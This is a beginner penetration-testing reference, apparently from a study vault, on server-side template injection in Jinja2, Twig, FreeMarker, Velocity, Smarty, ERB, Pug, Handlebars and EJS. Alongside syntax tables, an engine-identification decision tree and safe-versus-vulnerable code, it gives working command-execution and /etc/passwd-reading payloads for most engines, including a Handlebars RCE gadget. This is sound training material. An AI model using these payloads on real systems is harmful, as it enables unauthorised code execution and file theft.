---
tags: [vapt, ssti, beginner, reference]
difficulty: beginner
module: "09 - SSTI"
topic: "09.02 Template Engines Overview"
---

# 09.02 — Template Engines Reference

## Identification by Syntax

```
ENGINE        VARIABLE      EXPRESSION    COMMENT       IF BLOCK
------        --------      ----------    -------       --------
Jinja2        {{ var }}     {{ 7*7 }}     {# comment #} {% if x %}
Twig          {{ var }}     {{ 7*7 }}     {# comment #} {% if x %}
FreeMarker    ${var}        ${7*7}        <#-- ... -->  <#if x>
Velocity      $var          ${7*7}        ## comment    #if($x)
Smarty        {$var}        {7*7}         {* comment *} {if $x}
ERB (Ruby)    <%= var %>    <%= 7*7 %>    <%# comment%> <% if x %>
Pug           #{var}        #{7*7}        // comment    if x
Handlebars    {{var}}       (limited)     {{! comment}} {{#if x}}
EJS           <%= var %>    <%= 7*7 %>    <%# comment%> <% if(x){ %>
Razor (.NET)  @Model.Var    @(7*7)        @* comment *@ @if(x)
Thymeleaf     ${var}        ${7*7}        <!--/* -->    th:if="${x}"
```

---

## Jinja2 (Python/Flask)

```python
# SYNTAX:
{{ variable }}          → outputs variable value
{{ 7*7 }}               → 49
{{ config }}            → Flask config dict (LEAKS SECRET_KEY!)
{% for x in range(10) %} ... {% endfor %}
{% if condition %} ... {% endif %}
{{ var | upper }}       → filter: uppercase
{{ var | e }}           → HTML escape filter (safe mode)

# TEST PAYLOADS:
{{7*7}}                 → 49 = Jinja2 confirmed!
{{7*'7'}}               → 7777777 = Jinja2 (string * int = repetition)
{{config}}              → Flask config dict
{{request.environ}}     → WSGI environ (server env vars)

# JINJA2 DELIMITERS:
{{ ... }} = expression (outputs value)
{% ... %} = statement (if, for, set, etc.)
{# ... #} = comment (not rendered)
{%- ... -%} = whitespace control

# SAFE TEMPLATE (not vulnerable):
render_template('page.html', name=user_input)  ← SAFE: data passed separately
# UNSAFE (vulnerable):
render_template_string('Hello ' + user_input)  ← VULNERABLE!
render_template_string(f'Hello {user_input}')  ← VULNERABLE!
```

---

## Twig (PHP)

```php
// SYNTAX (very similar to Jinja2):
{{ variable }}
{{ 7*7 }}               → 49 (Twig confirmed)
{{7*'7'}}               → 49 (not 7777777 → distinguishes from Jinja2!)
{{ _self.env }}         → Twig environment object

// TWIG-SPECIFIC:
{{ app }}               → Symfony Application object
{{ app.request }}       → HTTP Request object
{{ app.user }}          → Current user
{{ app.session }}       → Session data
{{ constant('PHP_OS') }}  → Server OS!

// TEST:
{{7*7}} → if 49 → could be Jinja2 or Twig
{{7*'7'}} → if 49 → Twig; if 7777777 → Jinja2!

// VULNERABLE CODE (PHP):
$twig = new Twig\Environment($loader);
$template = $twig->createTemplate("Hello {$input}!");  // VULNERABLE
// SAFE:
$twig->render('template.html', ['name' => $input]);    // SAFE
```

---

## FreeMarker (Java)

```java
// SYNTAX:
${variable}             → output variable
${7*7}                  → 49
<#assign x = 7>         → assign variable
<#if x == 7>...</#if>   → conditional
<#list items as item>   → loop
${.now?string}          → current datetime
${"Hello"?upper_case}   → string function

// DANGEROUS:
${"freemarker.template.utility.Execute"?new()("id")}
// → freemarker.template.utility.Execute class → execute OS commands!

// TEST:
${7*7} → 49 = FreeMarker!
${.version} → FreeMarker version number

// NOTE: FreeMarker often used in Java enterprise apps
// → Higher impact as these are often internal/enterprise systems
```

---

## Velocity (Java/Apache)

```java
// SYNTAX:
$variable               → output
${variable}             → output (explicit)
$!{variable}            → output (empty string if null)
#if($x)...$end          → conditional
#foreach($item in $list)...$end  → loop
#set($x = "value")      → assign

// TEST:
${7*7}     → 49 = Velocity (or FreeMarker)
$class.inspect("java.lang.Runtime", true)  → access Runtime!

// DANGEROUS:
#set($x = "")
#set($rt = $x.class.forName('java.lang.Runtime'))
#set($chr = $x.class.forName('java.lang.Character'))
#set($str = $x.class.forName('java.lang.String'))
#set($ex = $rt.getRuntime().exec("id"))

// NOTE: Velocity is common in Apache Struts, Confluence, JIRA
```

---

## Smarty (PHP)

```php
// SYNTAX:
{$variable}             → output
{7*7}                   → might output 7*7 or 49 depending on config
{"hello"|upper}         → "HELLO"

// DANGEROUS TAGS:
{php}phpinfo();{/php}   → executes PHP code!
{if system("id")}{/if}  → command execution!
{eval code="system('id')"}  → same

// TEST:
{7*7}    → 49 = Smarty
{$smarty.version}  → Smarty version

// NOTE: Smarty disabled {php} in newer versions — but {if} still allows PHP!
```

---

## ERB (Ruby on Rails)

```ruby
# SYNTAX:
<%= expression %>    → output (equivalent to {{ }})
<% code %>           → execute code, no output
<%# comment %>       → comment

# TEST:
<%= 7*7 %>   → 49 = ERB!
<%= File.read('/etc/passwd') %>   → file read!
<%= `id` %>   → command execution (backtick in Ruby = shell command)!

# DANGEROUS:
<%= system('id') %>             → runs id
<%= exec("id") %>               → runs id
<%= IO.popen("id").read %>      → runs id, returns output
<%= %x[id] %>                   → another shell execution method
<%= `id` %>                     → backtick = shell execution in Ruby

# VULNERABLE CODE:
ERB.new(user_input).result(binding)  # VULNERABLE!
# SAFE:
ERB.new('<%= name %>').result_with_hash({name: user_input})  # SAFE
```

---

## Pug/Jade (Node.js)

```javascript
// SYNTAX:
// Variables: #{variable}
// Script: - var x = 5
// Output: = expression

// TEST:
#{7*7}    → 49 = Pug!
- var output = require('child_process').execSync('id').toString()
= output       → runs id, outputs!

// DANGEROUS CODE IN PUG:
- var x = require('child_process')
= x.execSync('id').toString()

// VULNERABLE CODE:
var pug = require('pug');
pug.render(user_input)  // VULNERABLE!
// SAFE:
pug.render('p #{name}', {name: userInput})  // SAFE
```

---

## Handlebars (Node.js)

```javascript
// SYNTAX:
{{variable}}            → safe output (HTML-escaped)
{{{variable}}}          → raw output (not escaped — XSS!)
{{helper arg}}          → helper function

// HANDLEBARS IS SAFER — limited expression evaluation
// BUT: Prototype pollution + Handlebars = RCE!

// PROTOTYPE POLLUTION PAYLOAD:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## EJS (Node.js/Express)

```javascript
// SYNTAX:
<%= variable %>         → output (HTML-escaped)
<%- variable %>         → raw output (not escaped!)
<% code %>              → execute code
<%# comment %>          → comment

// TEST:
<%= 7*7 %>              → 49 = EJS

// DANGEROUS:
<%= require('child_process').execSync('id').toString() %>
<%- include('/etc/passwd') %>   → file inclusion!

// VULNERABLE:
ejs.render(user_input, data)  // VULNERABLE!
// SAFE:
ejs.render('<h1><%=name%></h1>', {name: userInput})  // SAFE
```

---

## Identifying the Template Engine

```
DECISION TREE:
  1. Inject: {{7*7}}
     → 49: Jinja2, Twig, or Nunjucks
     → error: not Jinja2/Twig
  
  2. If step 1 gave 49: Inject {{7*'7'}}
     → 7777777: JINJA2 (Python)
     → 49: TWIG (PHP)
  
  3. Inject: ${7*7}
     → 49: FreeMarker, Velocity, EL (Java), Thymeleaf
     → error: not Java template
  
  4. Inject: <%= 7*7 %>
     → 49: ERB (Ruby) or EJS (Node.js)
  
  5. Inject: #{7*7}
     → 49: Pug/Jade (Node.js)
  
  6. Inject: {7*7}
     → 49: Smarty (PHP)
  
  7. Look at HTTP headers:
     X-Powered-By: Express → Node.js
     X-Powered-By: PHP → PHP
     Server: WEBrick → Ruby
     Server: Jetty/Tomcat → Java
```

---

## Related Notes
- [[01 - What is SSTI]] — SSTI fundamentals
- [[03 - Detecting SSTI]] — detection methodology
- [[04 - SSTI in Jinja2]] — Jinja2 exploitation
- [[05 - SSTI in Twig]] — Twig exploitation
- [[06 - SSTI in Freemarker]] — Java exploitation
